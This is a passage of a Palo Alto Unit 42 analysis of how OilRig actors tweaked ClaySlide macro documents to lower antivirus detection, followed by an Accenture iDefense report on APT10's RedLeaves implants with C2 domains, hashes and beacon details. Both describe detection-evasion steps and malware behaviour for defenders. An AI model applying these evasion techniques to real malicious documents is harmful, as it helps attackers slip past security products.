focus onto changing the function names within the macro, which did not result in any change in the detection rate. After a 40-minute break, it appears the actor reverts to the base macro instead of modifying the previously created test file. Again, the actor modifies the code in the base macro responsible for saving and running the payload, but this time the actor changes the folder names it creates for the payload to store its generated files. Also, the two files generated during these activities that occurred after the actor reverted back to the base macro had keyboard-mashed strings for their decoy contents, which differed dramatically from the previous test files. During the entirety of this testing activity, the antivirus detection rate reached a high of 6 but ended with a zero vendors detecting the sample when the actor ceased testing activities, which suggests that the actor was satisfied with this result. However, we do not see conclusive evidence to suggest that the actor was attempting to evade a specific antivirus vendor. November 2016 Testing Activity On November 15, 2016, an actor related to the OilRig campaign began testing the ClaySlide delivery documents. While the testing activities in June began with the removal of the payloads from the delivery document, the files generated during the November testing all retained their Helminth payloads, all of which were the same payload that use the C2 domain of \xe2\x80\x9cupdateorg[.]com\xe2\x80\x9d. We have included an exhaustive analysis of the November 2016 testing activity in Appendix B. In the November testing, the actor appears to initially focus on making modifications to the Excel worksheet that contains the decoy contents. The changes made to the worksheet involved adding random strings to cells within the decoy, to changing the names of the worksheets themselves. Eventually, the actor completely changes the contents of the decoy to a different theme entirely, from a decoy containing routing settings to a list of weak passwords. In addition to making changes to the Excel worksheets that contain the decoy content, the actor also made changes to the worksheet that is initially displayed to the user. Taking a step back, as discussed in the Appendix in our initial OilRig blog, ClaySlide delivery documents initially open with a worksheet named \xe2\x80\x9cIncompatible\xe2\x80\x9d that displays content that instructs the user to \xe2\x80\x9cEnable Content\xe2\x80\x9d to see the contents of the document, which in fact runs the malicious macro and compromises the system. When the macro runs, it hides the \xe2\x80\x9cIncompatible\xe2\x80\x9d worksheet and displays the worksheet that contains the decoy document. The actor modified the \xe2\x80\x9cIncompatible\xe2\x80\x9d worksheet to include random strings, which appears to be an attempt to see if detection rules are using the hash of this sheet for detection purposes. Meanwhile, during these changes to the \xe2\x80\x9cIncompatible\xe2\x80\x9d worksheet, the actor is also making changes to the malicious macro as well. The actor began changing the function names in the malicious macro from \xe2\x80\x9cDoom_Init\xe2\x80\x9d and \xe2\x80\x9cDoom_ShowHideSheets\xe2\x80\x9d to \xe2\x80\x9cDoon_Init\xe2\x80\x9d and \xe2\x80\x9cDoon_SHSheet\xe2\x80\x9d to \xe2\x80\x9cIni\xe2\x80\x9d and \xe2\x80\x9cSHSheet\xe2\x80\x9d. At one point, the actor changed the order of the functions in the macro to see if it was the cause of detection. The actor also changed the variable name used to store the VB script used to run the Helminth payload from \xe2\x80\x9cBackupVbs\xe2\x80\x9d to \xe2\x80\x9cBackup_Vbs\xe2\x80\x9d. Another change made during these testing activities involved the actor splitting the command needed to create the scheduled task in several strings and concatenating them back together. This technique is interesting, as the resulting command is still functional which differs dramatically from the modifications seen in the June testing where the commands were changed to a point where they were no longer operational. The last change made to the malicious macro is the locations in which the macro obtains the payload. In all ClaySlide delivery documents, the macro obtains scripts related to the Helminth Trojan from specific cells within the \xe2\x80\x9cIncompatible\xe2\x80\x9d worksheet. By changing the cells containing the scripts, the actor is checking to see if detection rules are looking for scripts at these specific locations. By the time the threat actor ceased this testing activity, the actor had lowered the detection rate of the ClaySlide delivery document to 2, suggesting this was a satisfactory result. Like the June testing activity, we do not see conclusive evidence of the threat actor attempting to evade a specific antivirus vendor in the November testing. Conclusion The threat actors involved with the OilRig attack campaign have shown part of their playbook that involves testing and modifying their delivery documents prior to use in attacks. The purpose of these modifications is to evade detection from security products to extend the usage of their ClaySlide delivery documents. By analyzing these testing activities, we gain some helpful insight into the OilRig actors, specifically that this threat group is fairly mature from an operational standpoint and the fact that they hope to use their delivery documents as long as possible. We were already aware of this threat group making modifications to their ClaySlide delivery document that we discussed in our previous blog. Now we know that there is an organized process involved that results in these changes, rather than the threat actor arbitrarily making changes to parts of the delivery documents, such as filenames and payload behavior. This realization suggests that the OilRig threat group will continue to use their delivery documents for extended periods with subtle modifications to remain effective. Appendix A This appendix contains an in-depth analysis of each iteration of testing activity carried out by the OilRig actors in June 2016. We provide screenshots and diffs between files (when available) to visualize the modifications made during the iteration. Iteration 1 The actor removed all but three bytes from the VBS and PowerShell scripts, while the macro itself remains unchanged. This suggests that the delivery document no longer contains the malicious payload (Helminth scripts) used to infect the system. By removing the payload from the delivery document, the actor can isolate antivirus detection results based on the delivery document itself. Also, without the payload the samples no longer have some attributes and entities that security researchers typically use to correlate samples to a specific threat group, such as the C2 server of \xe2\x80\x9cupdate-kernal[.]net\xe2\x80\x9d that was in the payload in the base sample. With the payload removed, the actor focuses their efforts in subsequent iterations on modifying the macro within the delivery document. Iteration 2 The actor completely removed code that is responsible for a majority of the functionality within the macro. The code removed, as seen in Figure 2, is responsible for the following: Creating folders p \\Libraries\\dn \\Libraries\\tp Running a PowerShell command to create PowerShell script VB script Running a command to create a scheduled task to run the VB script Figure 2 Changes made in Iteration 2 Iteration 3 The actor adds the content removed in the previous iteration. However, the line of code responsible for running the command to create the scheduled task to run the VB script was omitted. This suggests the threat actor was testing to see if vendors were detecting ClaySlide samples based on this line within the macro. Figure 3 Changes made in Iteration 3 Iteration 4 The actor adds the line of code omitted from the previous iteration, suggesting this specific code was not used for detection purposes. The actor also changed the method in which it calls the PowerShell script in the \xe2\x80\x9ccmd\xe2\x80\x9d variable, by using a \xe2\x80\x9cWScript.Shell\xe2\x80\x9d object stored in the \xe2\x80\x9cwss\xe2\x80\x9d variable instead of creating a new \xe2\x80\x9cWScript.Shell\xe2\x80\x9d object. Figure 4 Changes made in Iteration 4 Iteration 5 The actor base64 encoded the contents of the \xe2\x80\x98cmd\xe2\x80\x99 variable that stored a command to invoke a PowerShell script that would save the payload to the filesystem. Also, the actor changed the command to create the scheduled task to be base64 encoded as well. These alterations do not come with a base64 decoding routine, suggesting that the sample generated in this iteration would result in an error. The lack of a decoding routine suggests that the actor does not waste time making sure the code actually works, as they could add code to support these changes. Figure 5 Changes made in Iteration 5 Iteration 6 The actor tests to see if the base64 encoded strings added in the previous iteration were detected by removing these strings and leaving the two command strings empty. Figure 6 Changes made in Iteration 6 Iteration 7 The actor adds the base64 encoded string for \xe2\x80\x9cpowershell.exe\xe2\x80\x9d within the \xe2\x80\x98cmd\xe2\x80\x99 variable and in place of the command to create the scheduled task. Figure 7 Changes made in Iteration 7 Iteration 8 The actor replaces the first base64 for \xe2\x80\x9cpowershell.exe\xe2\x80\x9d with the base64 encoded string to run the PowerShell command, but replaces the second \xe2\x80\x9cpowershell.exe\xe2\x80\x9d with the cleartext string to create the scheduled task. The base64 encoded PowerShell command is similar to those seen in previous iterations. However, the actor changed one of the filenames used to save the payload to \xe2\x80\x9cfiraeeye.vbs\xe2\x80\x9d (from \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d) and references a variable named \xe2\x80\x9cFireeayeVbs\xe2\x80\x9d (from \xe2\x80\x9cFireeyeVbs\xe2\x80\x9d) that does not appear in the code. Figure 8 Changes made in Iteration 8 Iteration 9 The actor replaces the cleartext string to create the scheduled task with the base64 encoded version of the string. However, the base64 encoded string changes the name of the created task from \xe2\x80\x9cGoogleUpdatesTaskMachineUI\xe2\x80\x9d to \xe2\x80\x9cGoosgleUpdatesTaskMachineUI\xe2\x80\x9d and the script name from \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d to \xe2\x80\x9cfireeyse.vbs\xe2\x80\x9d. Figure 9 Changes made in Iteration 9 Iteration 10 The actor makes changes to the base64 encoded strings that used as a command to use PowerShell to install the payload and to schedule a task to run the payload. The base64 encoded PowerShell command reintroduces the filename \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d and the variable name \xe2\x80\x9cFireeyeVbs\xe2\x80\x9d, both of which were changed in iteration 8; however, the base64 encoded command uses the string \xe2\x80\x9cpoawearshell\xe2\x80\x9d instead of \xe2\x80\x9cpowershell\xe2\x80\x9d. As for the base64 string used to create the scheduled task, the actor reintroduced the scheduled task name of \xe2\x80\x9cGoogleUpdatesTaskMachineUI\xe2\x80\x9d and script filename of \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d, which were changed in iteration 9. However, the actor uses the string \xe2\x80\x9cscshtassks\xe2\x80\x9d to see if the \xe2\x80\x9cschtasks\xe2\x80\x9d string was being detected. Figure 10 Changes made in Iteration 10 Iteration 11 The actor changed the base64 encoded strings within the \xe2\x80\x98cmd\xe2\x80\x99 variable and the string used to create the scheduled task. Instead of including the base64 encoded string of the PowerShell and create task command, the actor replaced these strings with the base64 encoded representation of the following string: source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat- research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html 1 2 source code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat- research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.htmlsource code from https://www.fireeye.com/blog/threat-research/2016/05/targeted_attacksaga.html The string above contains a link to a FireEye blog that provided an analysis of this delivery document. It should be noted that the following non-encoded string was included in previous samples as a comment within the macro: \xe2\x80\x98source code from https://www.fireeye.com/blog/threat-research/2016/05/tareted_attacksaga.html Figure 11 Changes made in Iteration 11 Iteration 12 The actor replaced the base64 strings within the \xe2\x80\x98cmd\xe2\x80\x99 variable and the string to create the scheduled task with randomly typed letters. It appears the actor performed two-handed keyboard mashing to generate the strings used in these variables. Figure 12 Changes made in Iteration 12 Iteration 13 The actor changed the randomly typed keys in the \xe2\x80\x98cmd\xe2\x80\x99 and the string for creating the scheduled task with the base64 strings from two iterations back. However, the base64 strings were added between opening and closing brackets. Figure 13 Changes made in Iteration 13 Iteration 14 The actor changed the base64 encoded strings used for the PowerShell command and the command to create a scheduled task from the last iteration to a hexadecimal string. The string contains the hexadecimal representation of the characters that make up the command to create the scheduled task, which was last seen in Iteration 4. Again, the script does not contain decoding functions to decode the hexadecimal values to the correct characters, therefore this script is not functional. Figure 14 Changes made in Iteration 14 Iteration 15 The actor changed the two function names that are run when the Excel document is opened. In all prior iterations, these function names were \xe2\x80\x9cfireeye_Init\xe2\x80\x9d and \xe2\x80\x9cfireeye_ShowHideSheets\xe2\x80\x9d, which are responsible for installing the Trojan and displaying the decoy contents within the Excel spreadsheet, respectively. The actor changed these two function names to \xe2\x80\x9cfireeye_Init2\xe2\x80\x9d and \xe2\x80\x9cfireeye_ShowHideSheets3\xe2\x80\x9d to determine if the function names were being detected by antivirus products. Figure 15 Changes made in Iteration 15 Iteration 16 This iteration is very interesting, as we believe the actor reverts back to the base document instead of making changes to the document created in the previous iteration. The filename changed from an incrementing number to \xe2\x80\x9cttt.xls\xe2\x80\x9d, which is the same filename as the base document. Also, when we compared the sample from the previous iteration, there were a number of changes seen here: Figure 16 Changes made in Iteration 16 if compared with the file in Iteration 15 However, if you compare the file created in this iteration with the base file, the number of and type of changes seem to align closer to the modifications performed in previous iterations. If the actor reverted to the base document as we suspect, then modifications were made to the script filename, the folder names that store files generated by the payload, as well as the method the script invokes the PowerShell script. The actor changed the script filename from \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d to \xe2\x80\x9cfireueye.vbs\xe2\x80\x9d, changed the \xe2\x80\x9cup\xe2\x80\x9d, \xe2\x80\x9cdn\xe2\x80\x9d and \xe2\x80\x9ctp\xe2\x80\x9d folder names to \xe2\x80\x9cuup\xe2\x80\x9d, \xe2\x80\x9cdgn\xe2\x80\x9d and \xe2\x80\x9ctup\xe2\x80\x9d and uses the \xe2\x80\x9cWScript.Shell\xe2\x80\x9d object stored in the \xe2\x80\x9cwss\xe2\x80\x9d variable instead of creating a new \xe2\x80\x9cWScript.Shell\xe2\x80\x9d object to run the command. Figure 17 Changes made in Iteration 16 if actor reverted to the base file Iteration 17 In the last iteration of this testing activity, the actor changed some of the modifications made in the previous iteration back to the values used in the base document, specifically the filenames and folder names. However, the actor also adds a new variable to store the \xe2\x80\x9c%PUBLIC%\xe2\x80\x9d environment variable that the script uses as the path to store the \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d script and the folders that the payload would use. This iteration also includes a modified PowerShell command that attempts to run a command stored in the \xe2\x80\x9cfireeye.vbs\xe2\x80\x9d file, but does not include the portion of the command that would write the script to that file. The actor also removed the line that would run the command to create the scheduled task to run the VB script. Figure 18 Changes made in Iteration 17 Appendix B This appendix contains an in-depth analysis of each iteration of testing activity carried out by the OilRig actors in November 2016. We provide screenshots and diffs between files (when available) to visualize the modifications made during the iteration. Iteration 1 In the first iteration of this testing, the actor changed the decoy content from the base sample. At a high level, the decoy contents contained commands to configure a Cisco router with static routes and other settings. Originally, the base test file used in this testing activity contained just these configuration settings in an Excel worksheet named \xe2\x80\x9cSheet1\xe2\x80\x9d, as seen in Figure 19. Figure 19 Original decoy contents found in the base test file In the first iteration of testing, the actor changed the worksheet name that contains the decoy content from \xe2\x80\x9cSheet1\xe2\x80\x9d to \xe2\x80\x9chgvc\xe2\x80\x9d and added a string to the worksheet \xe2\x80\x9cjgvchhctf\xe2\x80\x9d, as seen in Figure 20. We believe the threat actor is attempting to determine if the worksheet name or the hash of the decoy worksheet were causing antivirus detection. Figure 20 Changes made to the decoy contents in Iteration 1 Iteration 2 The actor then changed the name of the worksheet that contains the decoy content from \xe2\x80\x9chgcv\xe2\x80\x9d to \xe2\x80\x9ctable\xe2\x80\x9d and completely changed the decoy content from the Cisco routing settings to a list of weak passwords, as seen in Figure 21. We believe this is the threat actor testing the new decoy content that they will use in an upcoming attack. Figure 21 New decoy contents introduced in Iteration 2 Iteration 3 Following the lead of previous iterations, the actor made modifications to the content in the Excel worksheet; however, in this iteration the changes were not made to the decoy worksheet, rather the change was made to the initial worksheet called \xe2\x80\x9cIncompatible\xe2\x80\x9d that displays the message to instruct the user to enable content to run the macro. As seen in Figure 22, the actor adds the string \xe2\x80\x9cyy\xe2\x80\x9d to this worksheet to determine whether antivirus vendors were detecting Clayslide documents based on this worksheet. Figure 22 Changes made to the Incompatible worksheet in Iteration 3 The actor also made modifications to the macro in this iteration, specifically by changing function names and by splitting up strings and concatenating them back together. The function names in the macro \xe2\x80\x9cDoom_Init\xe2\x80\x9d and \xe2\x80\x9cDoom_ShowHideSheets\xe2\x80\x9d were changed to \xe2\x80\x9cDoon_Init\xe2\x80\x9d and \xe2\x80\x9cDoon_SHSheet\xe2\x80\x9d to determine if these function names were causing detection. Also, the actor split the word \xe2\x80\x9cpowershell\xe2\x80\x9d in the commands within the macro and concatenated them together to retain functionality. Figure 23 Changes made to the macro in Iteration 3 Iteration 4 Much like the previous iteration, the threat actor makes changes to the Incompatible worksheet and the code within the macro. First, the threat actor added the string \xe2\x80\x9chi\xe2\x80\x9d to two cells within the initially displayed Incompatible worksheet, as seen in Figure 24. Figure 24 Changes made to the Incompatible worksheet in Iteration 4 The actor also made modifications to the macro in this iteration, as seen in Figure 25. The actor changed the two function names from \xe2\x80\x9cDoon_Ini\xe2\x80\x9d and \xe2\x80\x9cDoon_SHSheet\xe2\x80\x9d to \xe2\x80\x9cIni\xe2\x80\x9d and \xe2\x80\x9cSHSheet\xe2\x80\x9d respectively. Also, the actor changed the variable name that stores the VB script obtained from the spreadsheet from \xe2\x80\x9cBackupVbs\xe2\x80\x9d to \xe2\x80\x9cBackup_Vbs\xe2\x80\x9d, and modified the PowerShell command to use this new variable as well. Lastly, the actor further split the name of the created task using concatenation to retain functionality. Figure 25 Changes made to the macro in Iteration 4 Iteration 5 In this iteration, the actor rearranges the order of the functions in the script, specifically putting the \xe2\x80\x9cIni\xe2\x80\x9d function before the \xe2\x80\x9cSHSheet\xe2\x80\x9d function. Figure 26 shows this function reordering. Figure 26 Changes made to the macro within Iteration 5 Iteration 6 In the final iteration of testing, the actor moves the base64 encoded VB Script and the two base64 encoded PowerShell scripts to three different cells within the Incompatible worksheet. The actor also changes the macro to access the base64 encoded strings from these new locations, which retains the functionality of this document. Figure 27 Changes made to the macro in Iteration 6 \xc2 Get updates from Palo Alto Networks! Sign up to receive the latest news, cyber threat intelligence and research from us Please enter your email address! Please mark, I'm not a robot! By submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement. Popular Resources Resource Center Blog Communities Tech Docs Unit 42 Sitemap Legal Notices Privacy Terms of Use Documents Account Manage Subscriptions \xc2 Report a Vulnerability \xc2\xa9 2019 Palo Alto Networks, Inc. All rights reserved.
"Hogfish Redleaves Malware Threat Analysis I Accenture Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 1 HOGFISH REDLEAVES CAMPAIGN HOGFISH (APT10) targets Japan with RedLeaves implants in \xe2\x80\x9cnew battle\xe2\x80\x9d THREAT ANALYSIS HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 2 iDefense analysts have identified recent campaigns attributed to APT10, also known as HOGFISH and Stone Panda. This report provides a technical overview of the bespoke RedLeaves implants leveraged by the actor in their \xe2\x80\x9cnew battle\xe2\x80\x9d campaign. iDefense is providing information about this reported campaign to the general iDefense customer base so that customers are aware of the modus operandi of a highly active threat group that is targeting institutions for espionage purposes, especially in Japan. More specifically, this threat analysis is intended for security operations center (SOC) analysts and engineers. Intelligence analysts may also want to read this report. Additionally, management and executive leadership may want to use this information. SOC analysts and engineers can use this threat analysis detailed information pertaining to the workings of a malware family and indicators of compromise (IoCs) to contain or mitigate the discussed threat through monitoring or blocking. SOC analysts can use the information provided in the Analysis and Mitigation sections of this IA to conduct hunting activities on systems that may have already been compromised. Analysts and security engineers can use the IoCs by adding them to hunting lists on Endpoint Detection and Response (EDR) solutions as well as network- and host-based blacklists to detect and deny malware implantation and command-and-control (C2) communication. Intelligence analysts may want to use the information provided in this IA to better inform their own analyses. The provided information can also help inform ongoing intelligence analyses and forensic investigations, particularly for compromise discovery, damage assessment, and attribution. Management and executive leadership may use this information to assess the risks associated with the threat described herein to make operational and policy decisions accordingly. Knowledge of the tactics, techniques, and procedures (TTPs) used by the operators behind this campaign helps to better inform detection and response to attacks by this threat group. HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 3 HOGFISH (APT10) TARGETS JAPAN WITH REDLEAVES IMPLANTS IN NEW BATTLE REDLEAVES ANALYSIS The sample that iDefense analyzed for this report is a Word document with Japanese filename, 2018\xe5\xb9\xb4\xe5\xba\xa6\xef\xbc\x88\xe5\xb9\xb3\xe6\x88\x9030\xe5\xb9\xb4\xe5\xba\xa6\xef\xbc\x89\xe7\xa8\x8e\xe5\x88\xb6\xe6\x94\xb9\xe6\xad\xa3\xe3\x81\xab\xe3\x81\xa4\xe3\x81\x84\xe3\x81\xa6.doc, which translates to English as \xe2\x80\x9cAbout the 2018 fiscal year (Heisei 30) tax system revision.doc\xe2\x80\x9d. This document has the following properties: \xe2\x80\xa2 Filename: 2018\xe5\xb9\xb4\xe5\xba\xa6\xef\xbc\x88\xe5\xb9\xb3\xe6\x88\x9030\xe5\xb9\xb4\xe5\xba\xa6\xef\xbc\x89\xe7\xa8\x8e\xe5\x88\xb6\xe6\x94\xb9\xe6\xad\xa3\xe3\x81\xab\xe3\x81\xa4\xe3\x81\x84\xe3\x81\xa6.doc \xe2\x80\xa2 MD5: 797b450509e9cad63d30cd596ac8b608 \xe2\x80\xa2 File Size: 664.2 KB (680,095 bytes) \xe2\x80\xa2 Author: Windows \xe3\x83\xa6\xe3\x83\xbc\xe3\x82\xb6\xe3\x83\xbc (Windows user) \xe2\x80\xa2 Last Modified by: Windows \xe3\x83\xa6\xe3\x83\xbc\xe3\x82\xb6\xe3\x83\xbc (Windows user) \xe2\x80\xa2 Creation Time Stamp: 2018-01-09 03:56:00 (Jan. 9, 2018, 3:56 a.m.) \xe2\x80\xa2 Modified Time Stamp: 2018-01-09 04:25:00 (Jan. 9, 2018, 4:25 a.m.) After the document is opened, the victim is presented with a message from Office 365 to asking the victim to \xe2\x80\x9cEnable content\xe2\x80\x9d (see Exhibit 1). On the next page, however, iDefense identified what appears to be a base64-encoded string. Exhibit 1: Dropper Document The macro shown in Exhibit 2 will then perform the following sequence of actions: \xe2\x80\xa2 Drop the embedded base64-encoded content into a new file, ZsHUvtNctKYbgPj.txt, in the %temp% folder HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 4 \xe2\x80\xa2 Decode this new file by leveraging \xe2\x80\x9ccertutil\xe2\x80\x9d, a legitimate Windows program; the base64 encoded data decodes to a Microsoft Corp. Cabinet file, which is saved as YjhdJ.cab (MD5 hash: 44c7319d8d7b84c52c4a6c94056d246b) \xe2\x80\xa2 Use \xe2\x80\x9cexpand\xe2\x80\x9d, again a legitimate Windows program, to \xe2\x80\x9cexpand\xe2\x80\x9d or decompress file contents (AYRUNSC.exe and PTL.AYM) to the %temp% folder, and consequently delete the earlier created files Exhibit 2: VBA Macro As mentioned earlier, this malware creates two new binaries: AYRUNSC.exe and PTL.AYM. AYRUNSC.exe is a legitimate and digitally signed binary created by ESTsoft Corp. and pertains to ALYac, Korean anti-virus software. PTL.AYM is in fact another binary file; specifically, it is a DLL file with the following properties: \xe2\x80\xa2 Filename: PTL.AYM \xe2\x80\xa2 Internal Filename: ptl.dll \xe2\x80\xa2 MD5: 4f1ffebb45b30dd3496caaf1fa9c77e3 \xe2\x80\xa2 File Size: 440.0 KB (450,560 bytes) \xe2\x80\xa2 Compiled Time Stamp: 2018-01-08 02:15:02 (Jan. 8, 2018, 2:15 a.m.) The compiled time stamp, assuming it is not altered, suggests the actor developed the implant 2 days before launching the described campaign. This DLL is a clone of a legitimate DLL, also by ALYac, and corresponds to the anti-virus software\xe2\x80\x99s Utility Module. However, rather than the original DLL, it only has two imports as the authors have implemented a simple, single-byte XOR obfuscation (using key 0x40) to obfuscate other imports and strings. For example, XOR decoding the binary reveals the following two interesting strings: \xe2\x80\xa2 %ProgramFiles%\\Internet Explorer\\iexplore.exe \xe2\x80\xa2 \\GppiTEMms.lnk HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 5 As opposed to the original DLL by ALYac, which typically has 15 exports, the analyzed sample has the following 20 exports: \xe2\x80\xa2 ChangeScriptName \xe2\x80\xa2 FreeList \xe2\x80\xa2 GetFileName \xe2\x80\xa2 GetFilePath \xe2\x80\xa2 GetFilePath2 \xe2\x80\xa2 GetFilePathNew \xe2\x80\xa2 GetFilePathNew2 \xe2\x80\xa2 GetFolderPath \xe2\x80\xa2 GetFolderPath2 \xe2\x80\xa2 GetFolderPathNew \xe2\x80\xa2 GetFolderPathNew2 \xe2\x80\xa2 GetPathVariable \xe2\x80\xa2 GetPathVariableList \xe2\x80\xa2 GetSIDList \xe2\x80\xa2 Initialize \xe2\x80\xa2 Initialize_IjDEJK \xe2\x80\xa2 Lock \xe2\x80\xa2 NbhgHUxiGf \xe2\x80\xa2 UnInitialize \xe2\x80\xa2 rGBKikBeJObSwSjY Three exported functions clearly stood out: Initialize_IjDEJK, NbhgHUxiGf, and rGBKikBeJObSwSjY. These are, however, all dummy exports to throw off analysts or perhaps even taunt researchers, and more specifically perhaps to taunt the Japan Computer Emergency Response Team Coordination Center (JPCERT/CC). For example, when executing the DLL file by calling the NbhgHUxiGf export function, the victim would be prompted with a Windows message box with ""jpcert-1\xe2\x80\x9d, as can be shown in Exhibit 3 and 4. Exhibit 3: Windows message box creation HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 6 Exhibit 4: Windows message box with the message \xe2\x80\x9cjpcert-1\xe2\x80\x9d All other functions are either empty or also filled with calls to MessageBoxA(), which is unusual for DLL loading implants. However, one export function, GetFolderPathNew2, is responsible for loading the RedLeaves DLL implant by performing process hollowing in iexplore.exe, Microsoft Corp.\xe2\x80\x99s default browser. The initial process, AYRUNSC.exe, is unable to work correctly and will therefore exit. For persistence, RedLeaves will add a shortcut \xe2\x80\x9c.lnk\xe2\x80\x9d file in the user\xe2\x80\x99s Startup folder, which points to `AYRUNSC.exe\xe2\x80\x99, as shown in Exhibit 5. HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 7 Exhibit 5: GppiTEMms.lnk in Startup Folder Once running, the RedLeaves implant will then attempt to communicate with the following C2 domains, using HTTP, but connects to the C2 server on port 443: \xe2\x80\xa2 firefoxcomt.arkouowi[.]com \xe2\x80\xa2 update.arkouowi[.]com The configuration settings for the RedLeaves implant can be extracted from memory and contains the following information: \xe2\x80\xa2 Campaign ID: 2018-1-8-NewBattle \xe2\x80\xa2 Mutex: jH10689DS \xe2\x80\xa2 Key: babybear The string \xe2\x80\x9c2018-1-8-NewBattle\xe2\x80\x9d refers to the campaign ID set up by the actor and may allude the actor starting a \xe2\x80\x9cnew battle\xe2\x80\x9d (campaigns). The malware will create a unique version of the aforementioned mutex on the victim machine in order to avoid running the implant twice. HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 8 As mentioned before, RedLeaves will attempt to communicate over HTTP, using POST requests with a hardcoded User-Agent: POST /M6Xz5MOS/index.php HTTP/1.1 Connection: Keep-Alive Accept: */* User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E) Network traffic is encrypted with RC4 using the key \xe2\x80\x9cbabybear\xe2\x80\x9d. The RedLeaves implant has at least the following abilities: \xe2\x80\xa2 Take screenshots \xe2\x80\xa2 Gather browser usernames and passwords \xe2\x80\xa2 Gather extended system information \xe2\x80\xa2 Send, receive, and execute commands from the C2 server Further analysis also reveals that the RedLeaves implant described corresponds to the actor\xe2\x80\x99s \xe2\x80\x9cLavender\xe2\x80\x9d version of the malware family. For example, the strings \xe2\x80\x9cLAVENDERX\xe2\x80\x9d and \xe2\x80\x9cLAVENDERengin\xe2\x80\x9d (which are dynamically built on the stack) are used to determine the implant\xe2\x80\x99s version. HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 9 OTHER REDLEAVES IMPLANTS iDefense analysts also identified the RedLeaves samples with the following attributes: ed65bbe9498d3fb1e4d4ac0058590d88 \xe2\x80\xa2 Internal Filename: libcef.dll \xe2\x80\xa2 Starts in Function: cef_string_utf8_to_utf16 \xe2\x80\xa2 Compiled Time Stamp: 2018-01-18 04:38:12 (Jan. 18, 2108, 4:38 a.m.) \xe2\x80\xa2 Startup Item/Shortcut: BnorTEPkh.lnk \xe2\x80\xa2 C2 Server: algorithm.ddnsgeek[.]com \xe2\x80\xa2 Campaign ID: 2018-1-18-sgowen \xe2\x80\xa2 Mutex: rV6880B9 \xe2\x80\xa2 Key: babybear e2627a887898b641db720531258fd133 \xe2\x80\xa2 Internal Filename: libcef.dll \xe2\x80\xa2 Starts in Function: cef_initialize \xe2\x80\xa2 Compiled Time Stamp: 2018-01-29 09:36:41 (Jan. 29, 2018, 9:36 a.m.) \xe2\x80\xa2 Startup Item/Shortcut: EaahLDRej.lnk \xe2\x80\xa2 C2 Server: friendlysupport.giize[.]com \xe2\x80\xa2 Campaign ID: 2018-1-29-No.1 \xe2\x80\xa2 Mutex: 2N6541mb \xe2\x80\xa2 Key: moscowww The above sample, ed65bbe9498d3fb1e4d4ac0058590d88, also displays similar taunting messages (see Exhibit 6 and 7): HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 10 Exhibit 6: Message box with a taunting message Exhibit 7: Message box with another taunting message C2 INFRASTRUCTURE C2 infrastructure enumeration reveals overlap between the three samples that iDefense analyzed, as Exhibit 8 illustrates. HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 11 Exhibit 8: Maltego Graph Showing Campaigns Overlap MITIGATION To effectively defend against the threats described in this report, iDefense recommends blocking access to the following C2 domains and IP addresses: \xe2\x80\xa2 firefoxcomt.arkouowi[.]com \xe2\x80\xa2 update.arkouowi[.]com \xe2\x80\xa2 friendlysupport.giize[.]com \xe2\x80\xa2 algorithm.ddnsgeek[.]com \xe2\x80\xa2 149.36.63[.]65 \xe2\x80\xa2 83.136.106[.]108 HOGFISH REDLEAVES CAMPAIGN Copyright \xc2\xa9 2018 Accenture Security. All rights reserved. 12 Hashes (SHA-256): d956e2ff1b22ccee2c5d9819128103d4c31ecefde3ce463a6dea19ecaaf418a1 5504e04083d6146a67cb0d671d8ad5885315062c9ee08a62e40e264c2d5eab91 f6449e255bc1a9d4a02391be35d0dd37def19b7e20cfcc274427a0b39cb21b7b db7c1534dede15be08e651784d3a5d2ae41963d192b0f8776701b4b72240c38d Related hashes (SHA-256): f9acc706d7bec10f88f9cfbbdf80df0d85331bd4c3c0188e4d002d6929fe4eac e28294f62178451c7b11988d2c790f7f44c81b0bf06ab252e60f6b9ca57cacec 36db2c5f8bb947cad25a4abeaff1ff0e827bd7fcf9c77dbfb36247e3fc9f530a 4de5a22cd798950a69318fdcc1ec59e9a456b4e572c2d3ac4788ee96a4070262 